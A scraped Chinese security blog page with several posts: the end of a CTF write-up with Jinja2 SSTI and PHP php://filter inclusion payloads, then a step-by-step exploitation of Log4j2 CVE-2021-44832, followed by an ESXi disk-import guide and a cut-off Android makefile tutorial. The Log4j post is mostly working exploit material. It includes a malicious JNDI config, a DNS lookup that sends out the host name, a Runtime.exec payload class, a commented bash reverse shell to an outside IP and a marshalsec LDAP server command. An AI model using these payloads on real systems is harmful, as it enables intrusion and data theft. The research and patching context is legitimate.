<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215215529181.png" alt="image-20220215215529181"></p>
<p>带入万能payload构造eval执行命令</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> f,v <span class="keyword">in</span> whoami.__init__.__globals__.items() %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> f == bul %&#125; </span><br><span class="line">        &#123;% <span class="keyword">for</span> a,b <span class="keyword">in</span> v.items() %&#125;</span><br><span class="line">            &#123;% <span class="keyword">if</span> a == ev %&#125;</span><br><span class="line">                &#123;&#123;b(pld)&#125;&#125; </span><br><span class="line">            &#123;% endif %&#125;</span><br><span class="line">        &#123;% endfor %&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215215549758.png" alt="image-20220215215549758"></p>
<h2 id="flag-flag-m6WMnd6PKJyuxepVxGjgUCpl7JzWyDjS"><a href="#flag-flag-m6WMnd6PKJyuxepVxGjgUCpl7JzWyDjS" class="headerlink" title="flag : flag{m6WMnd6PKJyuxepVxGjgUCpl7JzWyDjS}"></a>flag : flag{m6WMnd6PKJyuxepVxGjgUCpl7JzWyDjS}</h2><h1 id="10083-文件包含"><a href="#10083-文件包含" class="headerlink" title="10083 文件包含"></a>10083 文件包含</h1><p>请求看源码，典型的文件包含，传入变量<code>file1</code>和<code>file2</code></p>
<p><code>payload：</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file1=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">file2=data:text/plain,hello ctf</span><br></pre></td></tr></table></figure>

<p>利用data协议传入原始文件流，利用php://filter协议包含flag.php文件源码</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215164654261.png" alt="image-20220215164654261">成功获取base64值解密得flag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> PD9waHAKZWNobyAiV1JPTkcgV0FZISI7Ci8vICRmbGFnID0gZmxhZ3sxbmx1ZGVfYW5kX2cwVF8xVCF9</span><br><span class="line"> </span><br><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;WRONG WAY!&quot;</span>;</span><br><span class="line"><span class="comment">// $flag = flag&#123;1nlude_and_g0T_1T!&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="flag-flag-1nlude-and-g0T-1T"><a href="#flag-flag-1nlude-and-g0T-1T" class="headerlink" title="flag: flag{1nlude_and_g0T_1T!}"></a><code>flag: flag&#123;1nlude_and_g0T_1T!&#125;</code></h2></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-12-29T02:34:17.000Z" title="2021/12/29 上午10:34:17">2021-12-29</time>发表</span><span class="level-item"><time dateTime="2021-12-29T03:51:47.528Z" title="2021/12/29 上午11:51:47">2021-12-29</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/Security/">Security</a></span><span class="level-item">5 分钟读完 (大约688个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/12/29/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Log4j2%E5%9F%BA%E4%BA%8EJDBCAPPENDER%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C-CVE-2021-44832/">Log4j2基于JDBCAPPENDER配置文件任意文件执行(CVE-2021-44832)</a></h1><div class="content"><blockquote>
<p>前期<code>log4j2</code>存在的远程代码执行漏洞<code>（CVE-2021-44228）</code>引起了轩然大波。昨天上网冲浪发现，<code>checkmark</code>研究员<code>YANIV NIZRY</code>公布了新版本<code>log4j2 2.17.0</code>中存在基于<code>JDBCAPPENDER</code>配置文件的任意命令执行。且该漏洞已经公布其<code>CVE</code>编号为<code>CVE-2021-44832</code>。</p>
</blockquote>
<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p><code>log4j2</code>在进行<code>JDBC</code>反序列化之前，可以通过<code>JNDI</code>动态远程获取数据库源文件。官方配置文档的格式如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">&quot;error&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">JDBC</span> <span class="attr">name</span>=<span class="string">&quot;databaseAppender&quot;</span> <span class="attr">tableName</span>=<span class="string">&quot;dbo.application_log&quot;</span>&gt;</span></span><br><span class="line">		     <span class="tag">&lt;<span class="name">DataSource</span> <span class="attr">jndiName</span>=<span class="string">&quot;java:/comp/env/jdbc/LoggingDataSource&quot;</span> /&gt;</span></span><br><span class="line">		 <span class="tag">&lt;<span class="name">Column</span> <span class="attr">...</span></span></span><br><span class="line"><span class="tag">	&lt;/<span class="attr">JDBC</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line">…</span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里可以尝试控制任意<code>LDAP</code>的<code>URL</code>,而达成对应的利用。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">DataSource</span> <span class="attr">jndiName</span>=<span class="string">&quot;ldap://127.0.0.1:1389/Exploit&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="本地复现"><a href="#本地复现" class="headerlink" title="本地复现"></a>本地复现</h1><p>本地获取<code>2.17.0</code>版本<code>log4j2</code></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-rce<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>n</span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.17.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.17.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;dependency&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            &lt;groupId&gt;commons-collections&lt;/groupId&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            &lt;version&gt;3.1&lt;/version&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;/dependency&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>这里直接借助<code>CVE-2021-44228 poc</code>来进行测试</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Log4j2</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;log4j2.configurationFile&quot;</span>,<span class="string">&quot;http://192.168.1.81:8000/config.xml&quot;</span>);</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">        <span class="keyword">final</span> Logger logger = LogManager.getLogger(Log4j2.class);</span><br><span class="line"></span><br><span class="line">        Scanner sc = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        String str;</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">            str = sc.nextLine();</span><br><span class="line">            logger.error(str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>本地提供一个<code>config.xml</code>的配置文件</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">&quot;error&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">JDBC</span> <span class="attr">name</span>=<span class="string">&quot;databaseAppender&quot;</span> <span class="attr">tableName</span>=<span class="string">&quot;dbo.application_log&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">DataSource</span> <span class="attr">jndiName</span>=<span class="string">&quot;dns://$&#123;env:COMPUTERNAME&#125;.mya9m5.dnslog.cn/exp&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Column</span> <span class="attr">name</span>=<span class="string">&quot;eventDate&quot;</span> <span class="attr">isEventTimestamp</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Column</span> <span class="attr">name</span>=<span class="string">&quot;level&quot;</span> <span class="attr">pattern</span>=<span class="string">&quot;%level&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Column</span> <span class="attr">name</span>=<span class="string">&quot;logger&quot;</span> <span class="attr">pattern</span>=<span class="string">&quot;%logger&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Column</span> <span class="attr">name</span>=<span class="string">&quot;message&quot;</span> <span class="attr">pattern</span>=<span class="string">&quot;%message&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Column</span> <span class="attr">name</span>=<span class="string">&quot;exception&quot;</span> <span class="attr">pattern</span>=<span class="string">&quot;%ex&#123;full&#125;&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">JDBC</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;warn&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;databaseAppender&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行后接收请求:</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211229112453677.png" alt="image-20211229112453677"></p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>编写一个<code>exp</code>攻击，发起弹出计算机的命令，并且本地编译成恶意<code>class</code>类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exp</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">// System.out.print(&quot;正在执行命令&quot;);</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            <span class="comment">// String[] commands = &#123;&quot;bash -i &gt;&amp; /dev/tcp/139.196.234.164/5555 0&gt;&amp;1&quot;&#125;;</span></span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;Calc&quot;</span>&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            System.out.println(<span class="string">&quot;正在执行命令&quot;</span>);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>恶意exp类文件目录下开启简易http服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8001</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211229113202656.png" alt="image-20211229113202656"></p>
<p>恶意config.xml文件目录下开启简易http服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server </span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211229113036815.png" alt="image-20211229113036815"></p>
<p>使用<code>marshalsec</code>启动恶意<code>ldap</code>服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="string">&quot;http://192.168.1.81:8001/#exp&quot;</span> 7788</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211229113202656.png"></p>
<p>修改<code>config.xml</code>文件<code>DataSource</code>为</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">DataSource</span> <span class="attr">jndiName</span>=<span class="string">&quot;ldap://192.168.1.81:7788/exp&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行<code>Log4j2.java</code>触发恶意代码执行：</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211229113604804.png" alt="image-20211229113604804"></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>该漏洞利用之处比较鸡肋，你需要能够拥有修改本地<code>config</code>文件的权限才能达成对应的利用，因此其影响面相对较窄。但是出于安全考虑，还是建议将其更新至最新版本.</p>
<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p><a target="_blank" rel="noopener" href="https://logging.apache.org/log4j/2.x/security.html">https://logging.apache.org/log4j/2.x/security.html</a></p>
<p>将 <code>Apache Log4j2 </code>升级到 2.17.1、2.12.4 和 2.3.2 或更高版本。</p>
<h1 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h1><ul>
<li><a target="_blank" rel="noopener" href="https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/">https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/</a></li>
</ul>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-12-28T06:16:20.000Z" title="2021/12/28 下午2:16:20">2021-12-28</time>发表</span><span class="level-item"><time dateTime="2021-12-28T09:27:17.760Z" title="2021/12/28 下午5:27:17">2021-12-28</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></span><span class="level-item">4 分钟读完 (大约667个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/12/28/%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/">内网渗透之代理转发</a></h1><div class="content"><blockquote>
<p>在日常渗透测试过程中，当我们<code>getshell</code>一台边界主机后，经常需要借助边界主机实现对内网主机流量的转发和代理操作。这里可以使用一些代理脚本和转发工具将内网的流量代理和转发到本地进行访问，以方便我们后续内网渗透。这边着重介绍一下在内网渗透中常用的几种转发协议的特点和代理工具的使用。</p>
</blockquote></div><a class="article-more button is-small is-size-7" href="/2021/12/28/%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/#more">阅读更多</a></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-12-27T06:15:17.000Z" title="2021/12/27 下午2:15:17">2021-12-27</time>发表</span><span class="level-item"><time dateTime="2021-12-27T07:04:13.377Z" title="2021/12/27 下午3:04:13">2021-12-27</time>更新</span><span class="level-item">2 分钟读完 (大约252个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/12/27/config/%E5%85%B3%E4%BA%8EVMware%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F%E5%AF%BC%E5%85%A5ESXi%E7%9A%84%E6%96%B9%E6%B3%95/">关于VMware磁盘镜像导入ESXi的方法</a></h1><div class="content"><h2 id="多磁盘格式"><a href="#多磁盘格式" class="headerlink" title="多磁盘格式"></a>多磁盘格式</h2><p>首先将多个磁盘进行合并处理，使用<code>vmware</code>自带的<code>vmware-vdiskmanager.exe</code>工具</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;D:\InstallSoftware\VMware\VMware Workstation\vmware-vdiskmanager.exe&quot;</span> -r <span class="string">&quot;Windows Server 2008 R2 x64.vmdk&quot;</span> -t 0 ATT01-win2008.vmdk</span><br></pre></td></tr></table></figure>



<h2 id="单磁盘"><a href="#单磁盘" class="headerlink" title="单磁盘"></a>单磁盘</h2><p>单磁盘比较简单，直接找到虚拟机<code>vmdk</code>文件即可</p>
<h2 id="ESXi操作"><a href="#ESXi操作" class="headerlink" title="ESXi操作"></a><code>ESXi</code>操作</h2><p>首先创建一个对应镜像格式的虚拟机</p>
<img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211227144938346.png" alt="image-20211227144938346" style="zoom: 67%;" />

<p>创建成功后，删除该镜像的默认<code>vmdk</code>文件</p>
<p>打开<code>ESXi</code>的ssh，使用<code>sftp</code>工具连接上传镜像文件</p>
<p>上传路径<code>/vmfs/volumes/datastore1/</code></p>
<p>由于<code>vmware</code>的磁盘镜像格式和<code>ESXi</code>的有所不同，需要使用<code>ESXi</code>的<code>vmkfstools</code>工具进行转换</p>
<p>转换生成的镜像名称和刚刚创建的虚拟机镜像名保持一致</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmkfstools -i ATT01-win2008.vmdk ATT01-win2008R2.vmdk</span><br></pre></td></tr></table></figure>



<p>将转换后的磁盘移动到对应虚拟机的目录下</p>
<p>也可以先创建虚拟机，再上传磁盘到虚拟机目录下，再对其进行转换即可。</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-12-25T02:21:09.000Z" title="2021/12/25 上午10:21:09">2021-12-25</time>发表</span><span class="level-item"><time dateTime="2021-12-27T03:24:49.599Z" title="2021/12/27 上午11:24:49">2021-12-27</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/">安全竞赛</a></span><span class="level-item">5 分钟读完 (大约693个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/12/25/ctf/SCTF2021/">SCTF2021</a></h1><div class="content"><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/rome1920.jpg"></p></div><a class="article-more button is-small is-size-7" href="/2021/12/25/ctf/SCTF2021/#more">阅读更多</a></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-12-25T02:19:26.000Z" title="2021/12/25 上午10:19:26">2021-12-25</time>发表</span><span class="level-item"><time dateTime="2021-12-25T07:58:56.162Z" title="2021/12/25 下午3:58:56">2021-12-25</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/android/">android</a><span> / </span><a class="link-muted" href="/categories/android/jni/">jni</a></span><span class="level-item">7 分钟读完 (大约1015个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/12/25/wechat/Android%20Studio%E6%89%8B%E5%8A%A8%E4%BD%BF%E7%94%A8makefile%E7%BC%96%E8%AF%91/">Android Studio手动使用makefile编译</a></h1><div class="content"><h1 id="Android-Studio手动使用makefile编译"><a href="#Android-Studio手动使用makefile编译" class="headerlink" title="Android Studio手动使用makefile编译"></a>Android Studio手动使用makefile编译</h1><p>用makefile文件编译能够选择编译的目标是共享库或者可执行文件。</p>
<h2 id="新建Java工程"><a href="#新建Java工程" class="headerlink" title="新建Java工程"></a>新建Java工程</h2><p>用Android Studio新建一个普通<code>Empty Activity</code>项目。</p>
<h2 id="新建-jni-cpp-目录"><a href="#新建-jni-cpp-目录" class="headerlink" title="新建 jni/cpp 目录"></a>新建 jni/cpp 目录</h2><p>在刚刚创建好的项目中，在<code>src &gt; main</code>目录下新建<code>jni</code>或者<code>cpp</code>目录。新建文件<code>Android.mk</code>、<code>Application.mk</code>以及源码文件。</p>
<p><img src="https://gitee.com/koifishly/pb/raw/master/2021/12/24/23-02-634.png" alt="image-20211224230250586"></p>
<p><img src="https://gitee.com/koifishly/pb/raw/master/2021/12/24/23-06-657.png" alt="image-20211224230659627"></p>
<h2 id="Android-mk"><a href="#Android-mk" class="headerlink" title="Android.mk"></a>Android.mk</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Android.mk必须以LOCAL_PATH开头，注释#除外</span></span><br><span class="line"><span class="comment"># 设置工做目录，而my-dir则会返回Android.mk文件所在的目录</span></span><br><span class="line">LOCAL_PATH := <span class="variable">$(<span class="built_in">call</span> my-<span class="built_in">dir</span>)</span></span><br><span class="line"><span class="comment"># 借助CLEAR_VARS变量清除除LOCAL_PATH外的全部LOCAL_&lt;name&gt;变量</span></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$(CLEAR_VARS)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置模块的名称，即编译出来so或者可执行文件文件名</span></span><br><span class="line"><span class="comment"># 注，如果用Android Studio自带原生项目就要要和build.gradle中NDK节点设置的名字相同</span></span><br><span class="line">LOCAL_MODULE := helloworld</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定参与模块编译的C/C++源文件列表，多文件用&quot;\&quot;隔开</span></span><br><span class="line">LOCAL_SRC_FILES := helloworld.cpp</span><br><span class="line"></span><br><span class="line"><span class="comment">#### 可选选项</span></span><br><span class="line">LOCAL_CFLAGS += -fPIC</span><br><span class="line">LOCAL_LDFLAGS += 